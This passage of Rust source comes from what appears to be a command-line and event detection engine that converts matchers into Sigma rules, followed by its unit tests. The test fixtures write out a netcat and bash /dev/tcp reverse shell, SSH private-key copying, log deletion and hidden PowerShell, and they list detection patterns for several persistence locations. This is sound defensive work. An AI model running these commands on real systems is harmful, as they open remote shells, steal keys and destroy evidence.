        LinePred::All(v) => v.iter().for_each(|p| lower_line_selection(p, sel)),
        LinePred::Any(v) => match line_or_literals(v) {
            Some(lits) => add_or_group(sel, lits),
            None => {
                sel.simplified = true;
                if let Some(first) = v.first() {
                    lower_line_selection(first, sel);
                }
            }
        },
        // See `lower_arg_selection`: a dropped `not` broadens the scaffold.
        LinePred::Not(_) => sel.simplified = true,
        LinePred::Contains(s) | LinePred::Word(s) | LinePred::Prefix(s) | LinePred::Suffix(s) => {
            sel.contains_all.push(s.clone())
        }
        LinePred::Regex(re) => sel.regexes.push(re.as_str().to_string()),
    }
}

/// `Some(literals)` iff every branch is a plain contains-like leaf, so the `any`
/// can render as one `CommandLine|contains` OR-list; `None` otherwise.
fn arg_or_literals(branches: &[ArgPred]) -> Option<Vec<String>> {
    branches
        .iter()
        .map(|b| match b {
            ArgPred::Flag(s)
            | ArgPred::Eq(s)
            | ArgPred::Contains(s)
            | ArgPred::Prefix(s)
            | ArgPred::Suffix(s)
            | ArgPred::Word(s)
            | ArgPred::PathUnder(s) => Some(s.clone()),
            _ => None,
        })
        .collect()
}

fn line_or_literals(branches: &[LinePred]) -> Option<Vec<String>> {
    branches
        .iter()
        .map(|b| match b {
            LinePred::Contains(s)
            | LinePred::Word(s)
            | LinePred::Prefix(s)
            | LinePred::Suffix(s) => Some(s.clone()),
            _ => None,
        })
        .collect()
}

// --- event-axis lowering ----------------------------------------------------

/// One `field|modifier:` test of a scaffolded Sigma selection.
///
/// A single value renders as a scalar. Several render as a YAML sequence, which
/// Sigma reads as an **OR** — unless [`all_of`](SigmaField::all_of) says the
/// values were ANDed, which Sigma writes with an extra `|all`.
#[derive(Debug, Clone)]
pub struct SigmaField {
    /// The event field being tested, by its canonical name.
    pub field: String,
    /// The Sigma modifier chain, leading `|` included — `""` for a bare equality
    /// test, else `|contains` / `|startswith` / `|endswith` / `|re`.
    pub modifier: &'static str,
    /// The values tested, in authored order.
    pub values: Vec<String>,
    /// Several `values` are ANDed rather than ORed (`|all`).
    pub all_of: bool,
}

/// One named `selection:` block. Its fields are ANDed, as a Sigma map is.
#[derive(Debug, Clone, Default)]
pub struct SigmaBlock {
    /// The field tests, at most one per `(field, modifier)` pair.
    pub fields: Vec<SigmaField>,
}

impl SigmaBlock {
    /// Add a field test, folding it into an existing test of the same field and
    /// modifier. Two constraints on one key inside one selection are ANDed, and
    /// a Sigma map cannot repeat a key, so they become one `|all` value set.
    fn push_field(&mut self, incoming: SigmaField) {
        if let Some(existing) = self.fields.iter_mut().find(|f| {
            f.field.eq_ignore_ascii_case(&incoming.field) && f.modifier == incoming.modifier
        }) {
            for v in incoming.values {
                if !existing.values.contains(&v) {
                    existing.values.push(v);
                }
            }
            existing.all_of = existing.values.len() > 1;
            return;
        }
        self.fields.push(incoming);
    }
}

/// An `event` axis lowered for scaffolding: the class the rule's logsource comes
/// from, the selection blocks its `detection:` should carry, and any place the
/// lowering had to approximate.
///
/// Several `blocks` are alternatives the scaffold ORs together in its
/// `condition`, because one flat Sigma map cannot express a disjunction across
/// different keys.
#[derive(Debug)]
pub struct SigmaEventSelection {
    /// The class of record this rule is about.
    pub class: EventClass,
    /// One or more alternative selections, ORed.
    pub blocks: Vec<SigmaBlock>,
    /// Where the lowering widened or dropped a leaf, for the scaffold to flag
    /// rather than let the difference pass silently.
    pub notes: Vec<String>,
}

/// Lower one leaf to a Sigma field test.
///
/// `word` and `path_under` have no Sigma modifier. Each widens to the nearest
/// one that can only ever match *more* than the leaf did — never less — and says
/// so, so a scaffold is over-broad and visibly flagged rather than quietly
/// missing the cases the entry was written to catch.
fn lower_field_pred(f: &FieldPred, notes: &mut Vec<String>) -> Option<SigmaField> {
    let (modifier, value) = if let Some(s) = &f.eq {
        ("", s.clone())
    } else if let Some(s) = &f.contains {
        ("|contains", s.clone())
    } else if let Some(s) = &f.prefix {
        ("|startswith", s.clone())
    } else if let Some(s) = &f.suffix {
        ("|endswith", s.clone())
    } else if let Some(re) = &f.regex {
        ("|re", re.as_str().to_string())
    } else if let Some(s) = &f.word {
        notes.push(format!(
            "`{}` tests `word: {s}` — Sigma has no word-boundary modifier, so \
             `|contains` stands in and also matches `{s}` inside a longer word.",
            f.field
        ));
        ("|contains", s.clone())
    } else if let Some(s) = &f.path_under {
        notes.push(format!(
            "`{}` tests `path_under: {s}` — Sigma has no segment-aware modifier, \
             so `|startswith` stands in and also matches sibling paths that \
             merely share the prefix.",
            f.field
        ));
        ("|startswith", s.clone())
    } else {
        return None;
    };
    Some(SigmaField {
        field: f.field.clone(),
        modifier,
        values: vec![value],
        all_of: false,
    })
}

/// Lower an event predicate to alternative selection blocks, distributing `all`
/// over `any` so every alternative is a plain conjunction of field tests. The
/// alternatives that differ in only one key are folded back together afterwards
/// by [`merge_alternatives`].
fn lower_event_pred(pred: &EventPred, notes: &mut Vec<String>) -> Vec<SigmaBlock> {
    match pred {
        EventPred::Field(f) => lower_field_pred(f, notes)
            .map(|field| {
                vec![SigmaBlock {
                    fields: vec![field],
                }]
            })
            .unwrap_or_default(),
        EventPred::Comb(EventComb::Not(_)) => {
            notes.push(
                "A `not` was dropped: a Sigma selection is a positive test, so \
                 the exclusion it expressed is not represented here and this \
                 rule matches more than the entry does."
                    .to_string(),
            );
            Vec::new()
        }
        EventPred::Comb(EventComb::Any(branches)) => branches
            .iter()
            .flat_map(|b| lower_event_pred(b, notes))
            .collect(),
        EventPred::Comb(EventComb::All(parts)) => {
            let mut acc = vec![SigmaBlock::default()];
            for part in parts {
                let alts = lower_event_pred(part, notes);
                // A part that lowered to nothing (a dropped `not`) constrains
                // nothing; the remaining conjuncts still stand.
                if alts.is_empty() {
                    continue;
                }
                acc = acc
                    .iter()
                    .flat_map(|base| {
                        alts.iter().map(|alt| {
                            let mut merged = base.clone();
                            for f in &alt.fields {
                                merged.push_field(f.clone());
                            }
                            merged
                        })
                    })
                    .collect();
            }
            acc
        }
    }
}

/// Fold alternatives that differ in exactly one key's values into a single block
/// whose key carries a value sequence — `X and (Y=a or Y=b)` rather than
/// `(X and Y=a) or (X and Y=b)`. The two are equivalent, but the first is one
/// selection instead of two, which is how a hand-written rule would say it.
fn merge_alternatives(mut blocks: Vec<SigmaBlock>) -> Vec<SigmaBlock> {
    'again: loop {
        for i in 0..blocks.len() {
            for j in (i + 1)..blocks.len() {
                if let Some(merged) = merge_pair(&blocks[i], &blocks[j]) {
                    blocks[i] = merged;
                    blocks.remove(j);
                    continue 'again;
                }
            }
        }
        return blocks;
    }
}

/// Merge two alternatives when they test the same keys and differ in at most one
/// key's values. An ANDed (`|all`) value set never merges: appending an
/// alternative to it would silently turn the `or` into another `and`.
fn merge_pair(a: &SigmaBlock, b: &SigmaBlock) -> Option<SigmaBlock> {
    if a.fields.len() != b.fields.len() {
        return None;
    }
    let counterpart = |block: &SigmaBlock, f: &SigmaField| -> Option<SigmaField> {
        block
            .fields
            .iter()
            .find(|c| c.field.eq_ignore_ascii_case(&f.field) && c.modifier == f.modifier)
            .cloned()
    };
    let mut differing = None;
    for (i, fa) in a.fields.iter().enumerate() {
        let fb = counterpart(b, fa)?;
        if fa.values == fb.values {
            continue;
        }
        if fa.all_of || fb.all_of || differing.is_some() {
            return None;
        }
        differing = Some((i, fb));
    }
    let mut out = a.clone();
    // No differing key at all means the two alternatives are the same test
    // written twice; keeping one is the merge.
    if let Some((i, fb)) = differing {
        for v in fb.values {
            if !out.fields[i].values.contains(&v) {
                out.fields[i].values.push(v);
            }
        }
    }
    Some(out)
}

/// Collect literals from a line predicate.
fn collect_line_terms(pred: &LinePred, out: &mut Vec<String>) {
    match pred {
        LinePred::All(v) => v.iter().for_each(|p| collect_line_terms(p, out)),
        LinePred::Any(v) => {
            if let Some(first) = v.first() {
                collect_line_terms(first, out);
            }
        }
        LinePred::Not(_) => {}
        LinePred::Contains(s) | LinePred::Word(s) | LinePred::Prefix(s) | LinePred::Suffix(s) => {
            out.push(s.clone())
        }
        LinePred::Regex(_) => {}
    }
}

/// The literal a leaf keys on, or `None` for a `regex` leaf (a pattern cannot be
/// reversed into a literal — such entries rely on `KbEntry::example`).
fn str_leaf_literal(leaf: &StrLeaf) -> Option<String> {
    match leaf {
        StrLeaf::Eq(s)
        | StrLeaf::Contains(s)
        | StrLeaf::Prefix(s)
        | StrLeaf::Suffix(s)
        | StrLeaf::Word(s) => Some(s.clone()),
        StrLeaf::Regex(_) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::parser::parse_line;

    fn m(json: &str) -> Matcher {
        serde_json::from_str(json).expect("matcher parses")
    }

    /// Evaluate a matcher against a raw command line the way the analyzer does.
    fn matches(matcher: &Matcher, line: &str) -> bool {
        let commands = parse_line(line);
        matcher.evaluate(&commands, line.trim()).is_some()
    }

    #[test]
    fn program_exact_and_any_of() {
        let exact = m(r#"{ "program": "curl" }"#);
        assert!(matches(&exact, "curl http://x/y"));
        assert!(!matches(&exact, "wget http://x/y"));
        // Case-insensitive and wrapper-stripped (sudo) and path-normalized.
        assert!(matches(&exact, "sudo /usr/bin/CURL http://x"));

        let set = m(r#"{ "program": { "any": ["nc", "ncat"] } }"#);
        assert!(matches(&set, "nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches(&set, "ncat 10.0.0.1 4444"));
        assert!(!matches(&set, "socat - tcp:10.0.0.1:4444"));
    }

    #[test]
    fn flags_and_alternation() {
        let rev = m(r#"{
            "program": { "any": ["nc", "ncat"] },
            "args": { "all": [
                { "flag": "-e" },
                { "any": [ {"eq": "/bin/sh"}, {"eq": "/bin/bash"} ] }
            ] }
        }"#);
        assert!(matches(&rev, "nc -e /bin/sh 10.0.0.1 4444"));
        assert!(matches(&rev, "ncat -e /bin/bash 1.2.3.4 9001"));
        // Missing -e, or a different shell → no match.
        assert!(!matches(&rev, "nc /bin/sh 10.0.0.1 4444"));
        assert!(!matches(&rev, "nc -e /bin/zsh 10.0.0.1 4444"));
    }

    #[test]
    fn negation_of_a_flag() {
        // "tar creating an archive, but not listing" — contrived, exercises not.
        let pred = m(r#"{ "program": "tar", "args": { "all": [
            { "flag": "-c" }, { "not": { "flag": "-t" } }
        ] } }"#);
        assert!(matches(&pred, "tar -c -f out.tar /etc"));
        assert!(!matches(&pred, "tar -c -t -f out.tar"));
    }

    #[test]
    fn path_under_is_segment_aware() {
        let clear = m(r#"{ "program": "rm", "args": { "path_under": "/var/log" } }"#);
        assert!(matches(&clear, "rm -rf /var/log/nginx"));
        assert!(matches(&clear, "rm -rf /var/log")); // the directory itself
        // Not under /var/log — the substring FP the old matcher had.
        assert!(!matches(&clear, "rm -rf /var/logistics"));
        assert!(!matches(&clear, "cd /var/log && rm -rf target/debug"));
    }

    #[test]
    fn word_boundary_kills_substring_fp() {
        let key = m(r#"{ "line": { "word": "id_rsa" } }"#);
        assert!(matches(&key, "cp ~/.ssh/id_rsa /tmp/k"));
        assert!(matches(&key, "cat id_rsa")); // exact token
        // A different filename that merely contains the token is not a match.
        assert!(!matches(&key, "vim id_rsa_backup_notes.txt"));
    }

    #[test]
    fn positional_argument() {
        let pred = m(r#"{ "program": "dd", "args": {
            "at": { "index": 0, "value": { "prefix": "if=/dev/" } }
        } }"#);
        assert!(matches(&pred, "dd if=/dev/sda of=/tmp/disk.img"));
        assert!(!matches(&pred, "dd of=/tmp/x if=/dev/sda")); // not at index 0
    }

    #[test]
    fn line_predicate_contains() {
        let rev = m(r#"{ "line": { "contains": "/dev/tcp" } }"#);
        assert!(matches(&rev, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"));
        assert!(!matches(&rev, "echo hello"));
    }

    #[test]
    fn representative_round_trips_through_the_engine() {
        for json in [
            r#"{ "program": "curl" }"#,
            r#"{ "program": "rm", "args": { "path_under": "/var/log" } }"#,
            r#"{ "program": { "any": ["nc", "ncat"] }, "args": { "all": [
                { "flag": "-e" }, { "any": [ {"eq": "/bin/sh"} ] } ] } }"#,
            r#"{ "line": { "contains": "/dev/tcp" } }"#,
            r#"{ "line": { "word": "id_rsa" } }"#,
            // Positional `at` beyond index 0: the representative must place the
            // literal at the requested index (padding earlier positions), and a
            // co-occurring existential leaf must still be satisfied.
            r#"{ "program": "x", "args": { "all": [
                { "at": { "index": 2, "value": { "eq": "foo" } } },
                { "flag": "-z" } ] } }"#,
        ] {
            let matcher = m(json);
            let repr = matcher
                .representative_line()
                .unwrap_or_else(|| panic!("no representative for {json}"));
            assert!(
                matches(&matcher, &repr),
                "representative `{repr}` did not match its own matcher {json}",
            );
        }
    }

    #[test]
    fn event_axis_matches_class_and_field() {
        let reg = m(
            r#"{ "event": { "class": "registry", "field": "TargetObject", "contains": "\\Run" } }"#,
        );
        let mut fields = HashMap::new();
        fields.insert(
            "TargetObject".to_string(),
            "HKLM\\...\\CurrentVersion\\Run\\x".to_string(),
        );
        assert!(reg.evaluate_event("registry", &fields));
        assert!(!reg.evaluate_event("file", &fields)); // class mismatch
        assert!(!reg.evaluate_event("registry", &HashMap::new())); // field absent
        // A command-scoped matcher never matches an event.
        assert!(!m(r#"{ "program": "reg" }"#).evaluate_event("registry", &fields));
        // …and an event matcher does not match a command line.
        assert!(reg.evaluate(&[], "reg add HKLM").is_none());
    }

    #[test]
    fn event_match_rejects_empty_or_ambiguous_predicate() {
        let ev = |json: &str| m(json).event.expect("has event");
        assert!(
            ev(r#"{ "event": { "class": "registry", "field": "T", "contains": "x" } }"#)
                .validate()
                .is_ok()
        );
        // Both predicates set — ambiguous.
        assert!(
            ev(r#"{ "event": { "class": "registry", "field": "T", "contains": "x", "eq": "y" } }"#)
                .validate()
                .is_err()
        );
        // Neither set.
        assert!(
            ev(r#"{ "event": { "class": "registry", "field": "T" } }"#)
                .validate()
                .is_err()
        );
        // Empty `contains` would otherwise match every value — rejected, and never
        // matches even if it slipped through.
        let empty = m(r#"{ "event": { "class": "registry", "field": "T", "contains": "" } }"#);
        assert!(empty.event.as_ref().unwrap().validate().is_err());
        let mut fields = HashMap::new();
        fields.insert("T".to_string(), "anything".to_string());
        assert!(!empty.evaluate_event("registry", &fields));
    }

    #[test]
    fn event_axis_tests_several_fields_at_once() {
        // The case a flat one-field axis could not express: a network event is
        // only interesting when the address *and* the port both match.
        let c2 = m(r#"{ "event": { "class": "network", "all": [
            { "field": "DestinationIp",   "eq": "192.0.2.10" },
            { "field": "DestinationPort", "eq": "4444" } ] } }"#);
        let ev = |ip: &str, port: &str| {
            HashMap::from([
                ("DestinationIp".to_string(), ip.to_string()),
                ("DestinationPort".to_string(), port.to_string()),
            ])
        };
        assert!(c2.evaluate_event("network", &ev("192.0.2.10", "4444")));
        // Either half alone is not the detection.
        assert!(!c2.evaluate_event("network", &ev("192.0.2.10", "443")));
        assert!(!c2.evaluate_event("network", &ev("10.0.0.5", "4444")));
    }

    #[test]
    fn event_axis_supports_any_not_and_boundary_aware_leaves() {
        let pred = m(r#"{ "event": { "class": "file", "all": [
            { "field": "TargetFilename", "path_under": "/etc/cron.d" },
            { "not": { "field": "TargetFilename", "suffix": ".swp" } } ] } }"#);
        let f = |p: &str| HashMap::from([("TargetFilename".to_string(), p.to_string())]);
        assert!(pred.evaluate_event("file", &f("/etc/cron.d/backdoor")));
        // `path_under` is segment-aware, so the sibling directory is not a match.
        assert!(!pred.evaluate_event("file", &f("/etc/cron.daily/x")));
        // …and the negated editor swapfile is excluded.
        assert!(!pred.evaluate_event("file", &f("/etc/cron.d/backdoor.swp")));

        let any = m(r#"{ "event": { "class": "network", "any": [
            { "field": "DestinationPort", "eq": "4444" },
            { "field": "DestinationPort", "eq": "1337" } ] } }"#);
        let p = |v: &str| HashMap::from([("DestinationPort".to_string(), v.to_string())]);
        assert!(any.evaluate_event("network", &p("4444")));
        assert!(any.evaluate_event("network", &p("1337")));
        assert!(!any.evaluate_event("network", &p("443")));
    }

    #[test]
    fn event_field_names_are_matched_case_insensitively() {
        // Each ingest format names its own extras, so an author should not have to
        // guess the casing the reduction happened to use.
        let pred = m(
            r#"{ "event": { "class": "file", "field": "targetfilename", "eq": "/etc/shadow" } }"#,
        );
        let fields = HashMap::from([("TargetFilename".to_string(), "/etc/shadow".to_string())]);
        assert!(pred.evaluate_event("file", &fields));
    }

    #[test]
    fn unknown_event_class_or_leaf_is_a_load_time_error() {
        // A typo'd class or leaf would otherwise be an entry that silently never
        // fires. `EventMatch` gives up `deny_unknown_fields` to flatten its
        // predicate, so this pins the strictness that `FieldPred` and the
        // externally-tagged combinators provide in its place.
        for json in [
            r#"{ "event": { "class": "registery", "field": "T", "eq": "x" } }"#,
            r#"{ "event": { "class": "registry", "field": "T", "containz": "x" } }"#,
            r#"{ "event": { "class": "registry", "evry": [ { "field": "T", "eq": "x" } ] } }"#,
            // A missing `class` is not a "match everything" licence.
            r#"{ "event": { "field": "T", "eq": "x" } }"#,
        ] {
            assert!(
                serde_json::from_str::<Matcher>(json).is_err(),
                "expected a load error for {json}"
            );
        }
    }

    #[test]
    fn event_representative_round_trips_through_the_engine() {
        for json in [
            r#"{ "event": { "class": "registry", "field": "TargetObject", "contains": "\\Run" } }"#,
            r#"{ "event": { "class": "network", "all": [
                { "field": "DestinationIp", "eq": "192.0.2.10" },
                { "field": "DestinationPort", "eq": "4444" } ] } }"#,
            // Two leaves constraining one field must compose into a single value
            // that satisfies both, not overwrite each other.
            r#"{ "event": { "class": "file", "all": [
                { "field": "TargetFilename", "contains": "/LaunchAgents/" },
                { "field": "TargetFilename", "suffix": ".plist" } ] } }"#,
            r#"{ "event": { "class": "file", "field": "TargetFilename", "path_under": "/etc/cron.d" } }"#,
            r#"{ "event": { "class": "file", "field": "TargetFilename", "word": "id_rsa" } }"#,
            // `any` takes its first branch; `not` contributes nothing.
            r#"{ "event": { "class": "file", "all": [
                { "any": [ { "field": "TargetFilename", "eq": "/etc/shadow" } ] },
                { "not": { "field": "TargetFilename", "suffix": ".bak" } } ] } }"#,
        ] {
            let matcher = m(json);
            let (class, fields) = matcher
                .representative_event()
                .unwrap_or_else(|| panic!("no representative event for {json}"));
            assert!(
                matcher.evaluate_event(class.as_str(), &fields),
                "representative event {fields:?} did not match its own matcher {json}",
            );
        }
    }

    /// The round-trip above only proves the representative satisfies *opseclint's
    /// own* matcher, which a bare directory does too. It has to stand for the
    /// action to a third party as well: a Sigma rule watching a drop-in directory
    /// keys on the separator, and `/etc/cron.d` alone would read as no-fire and
    /// contradict a claim the ruleset does substantiate.
    #[test]
    fn a_path_under_representative_is_a_file_in_the_directory() {
        let matcher = m(
            r#"{ "event": { "class": "file", "field": "TargetFilename", "path_under": "/etc/cron.d" } }"#,
        );
        let (_, fields) = matcher.representative_event().expect("derivable");
        let repr = &fields["TargetFilename"];
        assert!(
            repr.starts_with("/etc/cron.d/") && repr.len() > "/etc/cron.d/".len(),
            "expected a member of the directory, got {repr}"
        );
        // A trailing separator on the base must not double up.
        let slashed = m(
            r#"{ "event": { "class": "file", "field": "TargetFilename", "path_under": "/etc/cron.d/" } }"#,
        );
        let (_, fields) = slashed.representative_event().expect("derivable");
        assert_eq!(fields["TargetFilename"], *repr);
    }

    #[test]
    fn a_bare_regex_event_predicate_has_no_representative() {
        // A pattern cannot be reversed into a field value, so such an entry could
        // never be self-checked — `KnowledgeBase::validate` rejects it on this.
        let bare = m(r#"{ "event": { "class": "file", "field": "TargetFilename",
                                     "regex": "^/etc/cron\\.[a-z]+/" } }"#);
        assert!(bare.representative_event().is_none());
        // It still evaluates normally against a real record.
        let fields = HashMap::from([(
            "TargetFilename".to_string(),
            "/etc/cron.daily/x".to_string(),
        )]);
        assert!(bare.evaluate_event("file", &fields));
        // Pairing the pattern with a literal makes it derivable again.
        let paired = m(r#"{ "event": { "class": "file", "all": [
            { "field": "TargetFilename", "prefix": "/etc/cron.daily/" },
            { "field": "TargetFilename", "regex": "^/etc/cron\\.[a-z]+/" } ] } }"#);
        let (class, repr) = paired.representative_event().expect("derivable");
        assert!(paired.evaluate_event(class.as_str(), &repr));
    }

    #[test]
    fn sigma_selection_program_and_anded_terms() {
        let matcher = m(r#"{ "program": "x", "args": { "contains": "aaa" },
                             "line": { "contains": "bbb" } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.image_endswith, vec!["x"]);
        assert_eq!(sel.contains_all, vec!["aaa", "bbb"]);
        assert!(sel.contains_any.is_empty() && !sel.simplified);
    }

    #[test]
    fn sigma_selection_lowers_alternation_to_or_groups() {
        // Program any-of -> Image list; an `any` of contains -> a CommandLine OR
        // group; neither is a lossy narrowing.
        let matcher = m(r#"{ "program": { "any": ["net", "net1"] },
                             "line": { "any": [ {"contains": "a"}, {"contains": "b"} ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.image_endswith, vec!["net", "net1"]);
        assert_eq!(sel.contains_any, vec!["a", "b"]);
        assert!(sel.contains_all.is_empty() && !sel.simplified);
    }

    #[test]
    fn unknown_field_is_rejected() {
        // A typo'd axis must fail loudly rather than silently match nothing.
        let err = serde_json::from_str::<Matcher>(r#"{ "programm": "curl" }"#);
        assert!(err.is_err());
    }

    #[test]
    fn regex_leaf_on_line_and_args() {
        // Line regex, case-insensitive, anchored with a word boundary.
        let line = m(r#"{ "line": { "regex": "-w\\s+(hidden|1)\\b" } }"#);
        assert!(matches(&line, "powershell -w hidden -enc AA=="));
        assert!(matches(&line, "powershell -W HIDDEN")); // case-insensitive
        assert!(matches(&line, "powershell -w 1"));
        assert!(!matches(&line, "echo -w hiddenish")); // \b stops the partial word

        // Arg regex is existential over the argument vector.
        let args = m(r#"{ "program": "dd", "args": { "regex": "^if=/dev/sd[a-z]$" } }"#);
        assert!(matches(&args, "dd if=/dev/sda of=/tmp/x"));
        assert!(!matches(&args, "dd if=/tmp/file of=/dev/null"));
    }

    #[test]
    fn regex_composes_with_other_leaves() {
        // The powershell-hidden shape: a regex ANDed with contains leaves.
        let matcher = m(r#"{ "line": { "all": [
            { "any": [ {"contains": "powershell"}, {"contains": "pwsh"} ] },
            { "regex": "-w(?:indowstyle|in|i)?\\s+hidden\\b" }
        ] } }"#);
        assert!(matches(&matcher, "powershell -windowstyle hidden"));
        assert!(matches(&matcher, "cmd /c pwsh -w hidden"));
        assert!(!matches(&matcher, "cmd /c echo -w hidden")); // no powershell token
        assert!(matcher.has_regex());
    }

    #[test]
    fn invalid_regex_is_a_load_time_error() {
        // A bad pattern must fail at deserialization, not silently never match.
        let err = serde_json::from_str::<Matcher>(r#"{ "line": { "regex": "-w(" } }"#);
        assert!(err.is_err());
    }

    #[test]
    fn sigma_selection_surfaces_regexes_and_contains() {
        // A regex leaf feeds `CommandLine|re`; the contains literal feeds
        // `CommandLine|contains` — neither drops the other.
        let matcher = m(r#"{ "line": { "all": [
            { "contains": "powershell" }, { "regex": "-w\\s+hidden" }
        ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.contains_all, vec!["powershell"]);
        assert_eq!(sel.regexes, vec!["-w\\s+hidden"]);
    }

    #[test]
    fn sigma_selection_flags_unrepresentable_nesting() {
        // `all` keeps every branch; a non-literal `any` falls back to its first
        // branch and `not` contributes nothing — and the loss is flagged so the
        // scaffold can warn instead of silently narrowing.
        let matcher = m(r#"{ "line": { "all": [
            { "regex": "aa" },
            { "any": [ { "regex": "bb" }, { "regex": "cc" } ] },
            { "not": { "regex": "dd" } }
        ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.regexes, vec!["aa", "bb"]);
        assert!(sel.simplified);
    }

    #[test]
    fn sigma_selection_flags_a_dropped_negation() {
        // A `not` can't be represented in a positive selection; the positive
        // terms survive but the loss is flagged (the private-key `.pub` shape).
        let matcher = m(r#"{ "line": { "all": [
            { "word": "id_rsa" }, { "not": { "contains": "id_rsa.pub" } }
        ] } }"#);
        let sel = matcher.sigma_selection();
        assert_eq!(sel.contains_all, vec!["id_rsa"]);
        assert!(sel.simplified);
    }

    /// One block's field tests as `(key, values, all_of)`, for terse assertions.
    fn keys(block: &SigmaBlock) -> Vec<(String, Vec<String>, bool)> {
        block
            .fields
            .iter()
            .map(|f| {
                (
                    format!("{}{}", f.field, f.modifier),
                    f.values.clone(),
                    f.all_of,
                )
            })
            .collect()
    }

    #[test]
    fn sigma_category_covers_every_event_class() {
        // Pinned: `--scaffold` emits these as a rule's logsource category, and
        // the same mapping is what makes a candidate rule comparable to an
        // entry's event axis.
        assert_eq!(EventClass::Network.sigma_category(), "network_connection");
        assert_eq!(EventClass::File.sigma_category(), "file_event");
        assert_eq!(EventClass::Registry.sigma_category(), "registry_set");
    }

    #[test]
    fn sigma_event_selection_is_none_without_an_event_axis() {
        assert!(
            m(r#"{ "line": { "contains": "x" } }"#)
                .sigma_event_selection()
                .is_none()
        );
    }

    #[test]
    fn sigma_event_lowers_each_leaf_to_its_sigma_modifier() {
        let leaf = |json: &str| {
            let sel = m(json).sigma_event_selection().expect("lowers");
            let block = sel.blocks.first().expect("one block").clone();
            (keys(&block), sel.notes.len())
        };
        let case = |leaf_json: &str| {
            format!(r#"{{ "event": {{ "class": "file", "field": "F", {leaf_json} }} }}"#)
        };

        assert_eq!(
            leaf(&case(r#""eq": "v""#)).0,
            vec![("F".into(), vec!["v".to_string()], false)]
        );
        assert_eq!(leaf(&case(r#""contains": "v""#)).0[0].0, "F|contains");
        assert_eq!(leaf(&case(r#""prefix": "v""#)).0[0].0, "F|startswith");
        assert_eq!(leaf(&case(r#""suffix": "v""#)).0[0].0, "F|endswith");
        assert_eq!(leaf(&case(r#""regex": "a.b""#)).0[0].0, "F|re");
        assert_eq!(leaf(&case(r#""regex": "a.b""#)).0[0].1, vec!["a.b"]);
        // The two leaves Sigma cannot express widen, and say so.
        assert_eq!(leaf(&case(r#""word": "v""#)).0[0].0, "F|contains");
        assert_eq!(leaf(&case(r#""word": "v""#)).1, 1);
        assert_eq!(leaf(&case(r#""path_under": "/v""#)).0[0].0, "F|startswith");
        assert_eq!(leaf(&case(r#""path_under": "/v""#)).1, 1);
        // The leaves with an exact Sigma equivalent approximate nothing.
        assert_eq!(leaf(&case(r#""contains": "v""#)).1, 0);
    }

    #[test]
    fn sigma_event_folds_a_same_key_any_into_one_value_list() {
        // Sigma reads a sequence under one key as an OR, so an alternation whose
        // branches share a field *and* a modifier needs no second selection.
        let sel = m(r#"{ "event": { "class": "registry", "any": [
            { "field": "TargetObject", "suffix": "\\Shell" },
            { "field": "TargetObject", "suffix": "\\Userinit" }
        ] } }"#)
        .sigma_event_selection()
        .expect("lowers");
        assert_eq!(sel.blocks.len(), 1);
        assert_eq!(
            keys(&sel.blocks[0]),
            vec![(
                "TargetObject|endswith".into(),
                vec!["\\Shell".to_string(), "\\Userinit".to_string()],
                false
            )]
        );
    }

    #[test]
    fn sigma_event_keeps_a_nested_homogeneous_any_in_one_block() {
        // The `winlogon-persist` shape: `all` of a leaf and an `any` that folds.
        let sel = m(r#"{ "event": { "class": "registry", "all": [
            { "field": "TargetObject", "contains": "\\Winlogon\\" },
            { "any": [
                { "field": "TargetObject", "suffix": "\\Shell" },
                { "field": "TargetObject", "suffix": "\\Userinit" } ] }
        ] } }"#)
        .sigma_event_selection()
        .expect("lowers");
        assert_eq!(sel.blocks.len(), 1);
        assert_eq!(
            keys(&sel.blocks[0]),
            vec![
                (
                    "TargetObject|contains".into(),
                    vec!["\\Winlogon\\".to_string()],
                    false
                ),
                (
                    "TargetObject|endswith".into(),
                    vec!["\\Shell".to_string(), "\\Userinit".to_string()],
                    false
                ),
            ]
        );
    }

    #[test]
    fn sigma_event_splits_a_heterogeneous_any_into_alternatives() {
        // The `sudoers-tamper` shape: two modifiers cannot share one key, so the
        // alternation has to become two selections.
        let sel = m(r#"{ "event": { "class": "file", "any": [
            { "field": "TargetFilename", "eq": "/etc/sudoers" },
            { "field": "TargetFilename", "path_under": "/etc/sudoers.d" }
        ] } }"#)
        .sigma_event_selection()
        .expect("lowers");
        assert_eq!(sel.blocks.len(), 2);
        assert_eq!(keys(&sel.blocks[0])[0].0, "TargetFilename");
        assert_eq!(keys(&sel.blocks[1])[0].0, "TargetFilename|startswith");
    }

    #[test]
    fn sigma_event_distributes_an_all_over_a_heterogeneous_any() {
        // `X and (A or B)` has no flat form, so it becomes `(X and A) or (X and
        // B)` — every alternative keeps the conjunct, so nothing is narrowed.
        let sel = m(r#"{ "event": { "class": "file", "all": [
            { "field": "A", "eq": "x" },
            { "any": [ { "field": "B", "eq": "y" }, { "field": "C", "contains": "z" } ] }
        ] } }"#)
        .sigma_event_selection()
        .expect("lowers");
        assert_eq!(sel.blocks.len(), 2);
        assert_eq!(
            keys(&sel.blocks[0]),
            vec![
                ("A".into(), vec!["x".to_string()], false),
                ("B".into(), vec!["y".to_string()], false)
            ]
        );
        assert_eq!(
            keys(&sel.blocks[1]),
            vec![
                ("A".into(), vec!["x".to_string()], false),
                ("C|contains".into(), vec!["z".to_string()], false)
            ]
        );
    }

    #[test]
    fn sigma_event_ands_a_repeated_key_with_all() {
        // A YAML map cannot repeat a key, so two ANDed tests of the same field
        // and modifier become one `|all` value set.
        let sel = m(r#"{ "event": { "class": "file", "all": [
            { "field": "F", "contains": "a" },
            { "field": "F", "contains": "b" }
        ] } }"#)
        .sigma_event_selection()
        .expect("lowers");
        assert_eq!(sel.blocks.len(), 1);
        assert_eq!(
            keys(&sel.blocks[0]),
            vec![(
                "F|contains".into(),
                vec!["a".to_string(), "b".to_string()],
                true
            )]
        );
    }

    #[test]
    fn sigma_event_drops_a_negation_with_a_note() {
        // A Sigma selection is a positive test; the exclusion is lost, which
        // broadens the rule rather than narrowing it, and is flagged.
        let sel = m(r#"{ "event": { "class": "file", "all": [
            { "field": "F", "eq": "x" },
            { "not": { "field": "F", "contains": "y" } }
        ] } }"#)
        .sigma_event_selection()
        .expect("lowers");
        assert_eq!(
